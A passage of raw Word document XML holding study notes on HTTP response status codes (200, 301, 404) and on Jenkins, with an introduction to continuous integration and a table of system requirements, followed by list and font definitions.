        </w:rPr>
        <w:t>missing</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> resource)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
        <w:t>Response status codes</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="00B84F48" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId278" w:history="1">
        <w:r w:rsidR="0034244E">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:color w:val="3F87A6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>HTTP response status codes</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> indicate if a specific HTTP request has been successfully completed. Responses are grouped into five classes: informational responses, successful responses, redirects, client errors, and </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>servers</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> errors.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="00B84F48" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="209"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId279" w:tooltip="The HTTP 200 OK success status response code indicates that the request has succeeded. A 200 response is cacheable by default." w:history="1">
        <w:r w:rsidR="0034244E">
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>200</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>: OK. The request has succeeded.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="00B84F48" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="209"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId280" w:tooltip="The HyperText Transfer Protocol (HTTP) 301 Moved Permanently redirect status response code indicates that the resource requested has been definitively moved to the URL given by the Location headers. A browser redirects to this page and search engines update th" w:history="1">
        <w:r w:rsidR="0034244E">
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>301</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>: Moved Permanently. This response code means that the URI of requested resource has been changed.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="00B84F48" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="209"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId281" w:tooltip="The HTTP 404 Not Found client error response code indicates that the server can't find the requested resource. Links which lead to a 404 page are often called broken or dead links, and can be subject to link rot." w:history="1">
        <w:r w:rsidR="0034244E">
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>404</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="0034244E">
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>: Not Found. The server cannot find the requested resource.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:p w:rsidR="006003C2" w:rsidRPr="00086498" w:rsidRDefault="006003C2" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00086498">
        <w:rPr>
          <w:b/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Jenkins</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="003221A6" w:rsidRDefault="00086498" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00086498">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rP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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00086498" w:rsidRDefault="003221A6" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="23"/>
          <w:szCs w:val="23"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Jenkins is a popular tool for performing continuous integration of software projects.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B1">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Why Jenkins?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B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Jenkins is </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>a software</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> that allows </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>continuous integration</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>. Jenkins will be installed on a server where the central build will take place. The following flowchart demonstrates a very simple workflow of how Jenkins works.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B1">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="1621155" cy="3200400"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="31745" name="Picture 31745" descr="Why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y Jenkin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21155" cy="3200400"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B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Along with Jenkins, sometimes, one might also see the association of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Hudson</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>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3221A6" w:rsidRDefault="003221A6" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00086498" w:rsidRPr="00086498" w:rsidRDefault="00086498" w:rsidP="004C44FA">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B1">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What is Continuous Integration?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B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C770B1" w:rsidRDefault="00C770B1" w:rsidP="00C770B1">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System Requirements</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075"/>
        <w:gridCol w:w="5985"/>
      </w:tblGrid>
      <w:tr w:rsidR="00C770B1" w:rsidTr="00C770B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JDK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JDK 1.5 or above</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C770B1" w:rsidTr="00C770B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2 GB RAM (recommended)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C770B1" w:rsidTr="00C770B1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30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Disk Space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No minimum requirement. Note that since all builds will be stored on the Jenkins machines, it has to be ensured that sufficient disk space is available for build storage.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C770B1" w:rsidTr="00C770B1">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30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Operating System Version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Jenkins can be installed on Windows, Ubuntu/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Debian</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>, Red Hat/Fedora/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>CentOS</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t xml:space="preserve">, Mac OS X, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>openSUSE</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>FReeBSD</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>OpenBSD</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>Gentoo</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00C770B1" w:rsidTr="00C770B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Java Container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770B1" w:rsidRDefault="00C770B1">
            <w:pPr>
              <w:spacing w:after="300"/>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>The WAR file can be run in any container that supports Servlet 2.4/JSP 2.0 or later</w:t>
            </w:r>
            <w:proofErr w:type="gramStart"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>.(</w:t>
            </w:r>
            <w:proofErr w:type="gramEnd"/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="313131"/>
                <w:sz w:val="21"/>
                <w:szCs w:val="21"/>
              </w:rPr>
              <w:t>An example is Tomcat 5).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="006003C2" w:rsidRDefault="006003C2" w:rsidP="004C44FA"/>
    <w:sectPr w:rsidR="006003C2" w:rsidSect="00833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Droid Sans">
    <w:altName w:val="Times New Roman"/>
    <w:panose1 w:val="00000000000000000000"/>
    <w:charset w:val="00"/>
    <w:family w:val="roman"/>
    <w:notTrueType/>
    <w:pitch w:val="default"/>
  </w:font>
  <w:font w:name="Segoe UI Semibold">
    <w:panose1 w:val="020B0702040204020203"/>
    <w:charset w:val="00"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E00002FF" w:usb1="4000A47B"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92E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4A44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1706E2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7D6A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9F36F0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="904C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A523F7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="06F2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2A0140"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="5D060C82"/>
    <w:lvl w:ilvl="0" w:tplc="2C3C4250">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="5B16C86C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="8C504E14" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="B4468AC8" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="7D8A84AA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="5" w:tplc="D0CA780E" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="4320"/>
        </w:tabs>
        <w:ind w:left="4320" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="6" w:tplc="4E7A04F0" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5040"/>
        </w:tabs>
        <w:ind w:left="5040" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="7" w:tplc="B56A24BA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="5760"/>
        </w:tabs>
        <w:ind w:left="5760" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="8" w:tplc="5A503E6C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="6480"/>
        </w:tabs>
        <w:ind w:left="6480" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
  </w:abstractNum>
  <w:abstractNum w:abstractNumId="5">
    <w:nsid w:val="0493360C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6AF48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A31360"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1AE4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4DC13E4"/>
    <w:multiLevelType w:val="hybridMultilevel"/>
    <w:tmpl w:val="9B661C62"/>
    <w:lvl w:ilvl="0" w:tplc="3192313A">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="720"/>
        </w:tabs>
        <w:ind w:left="720" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="1" w:tplc="E77ACE22">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="1440"/>
        </w:tabs>
        <w:ind w:left="1440" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="2" w:tplc="A00A248C" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2160"/>
        </w:tabs>
        <w:ind w:left="2160" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="3" w:tplc="83DC36BA" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="2880"/>
        </w:tabs>
        <w:ind w:left="2880" w:hanging="360"/>
      </w:pPr>
      <w:rPr>
        <w:rFonts w:ascii="Wingdings" w:hAnsi="Wingdings" w:hint="default"/>
      </w:rPr>
    </w:lvl>
    <w:lvl w:ilvl="4" w:tplc="CBF85CFC" w:tentative="1">
      <w:start w:val="1"/>
      <w:numFmt w:val="bullet"/>
      <w:lvlText w:val=""/>
      <w:lvlJc w:val="left"/>
      <w:pPr>
        <w:tabs>
          <w:tab w:val="num" w:pos="3600"/>
        </w:tabs>
        <w:ind w:left="3600" w:hanging="360"/>
      </w:pPr>
